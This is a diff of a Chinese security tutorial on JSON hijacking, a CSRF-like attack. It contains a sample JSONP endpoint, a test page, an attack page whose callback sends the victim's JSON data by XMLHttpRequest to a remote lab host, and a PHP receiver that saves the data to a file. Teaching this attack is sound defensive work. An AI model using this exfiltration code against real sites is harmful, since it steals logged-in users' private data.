@@ -1,10 +1,4 @@
-JSON是一种轻量级的数据交换格式，而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适。恶意攻击者通过某些特
-
-定的手段，将本应该返回给用户的JSON数据进行拦截，转而将数据发送回给恶
-
-意攻击者，这就是JSON劫持的大概含义。一般来说进行劫持的JSON数据都是
-
-包含敏感信息或者有价值的数据。
+JSON是一种轻量级的数据交换格式，而劫持就是对数据进行窃取（或者应该称为打劫、拦截比较合适。恶意攻击者通过某些特定的手段，将本应该返回给用户的JSON数据进行拦截，转而将数据发送回给恶意攻击者，这就是JSON劫持的大概含义。一般来说进行劫持的JSON数据都是包含敏感信息或者有价值的数据。
 
 攻击方法与csrf类似，都是需要用户登录帐号，身份认证还没有被消除的情况下访问攻击者精心设计好的的页面。就会获取json数据，把json数据发送给攻击者。
 
@@ -22,7 +16,7 @@ print $callback.'({"id" : "1","name" : "moonsec","email":"moon@moonsec.com"});';
 ?>
 ```
 
-**2、测试页面html**
+**2、测试页面 json.html**
 
 ```html
 <!DOCTYPE html>
@@ -39,9 +33,9 @@ print $callback.'({"id" : "1","name" : "moonsec","email":"moon@moonsec.com"});';
 </html>
 ```
 
-![img](../acess/wpsdsdss1.jpg) 
+![image-20210425235418633](../acess/image-20210425235418633.png) 
 
-**3、劫持json发送返回数据**
+**3、劫持json发送返回数据 json_attack.html**
 
 ```php+HTML
 <!DOCTYPE html>
@@ -54,7 +48,7 @@ print $callback.'({"id" : "1","name" : "moonsec","email":"moon@moonsec.com"});';
 function test(data){
     //alert(v.name);
     var xmlhttp = new XMLHttpRequest();
-    var url = "http://192.168.0.121/1.php?file=" + JSON.stringify(data);
+    var url = "http://192.168.31.125/1.php?file=" + JSON.stringify(data);
     xmlhttp.open("GET",url,true);
     xmlhttp.send();
     }
@@ -66,12 +60,12 @@ function test(data){
 </html>
 ```
 
-远程接收的php
+远程接收的1.php
 
 ```php
 <?php
 if($_GET['file']){
-	file_put_contents('json.txt',$_GET['file'])
+	file_put_contents('json.txt',$_GET['file']);
 }
 ?>
 ```
@@ -80,4 +74,4 @@ if($_GET['file']){
 
 当用户访问这个页面的时候就会把数据发送到远程的服务器上的1.PHP 1.php就会把得到的数据生成json.txt 
 
-![img](../acess/ghghfg.jpg) 
+![image-20210426000423364](../acess/image-20210426000423364.png) 
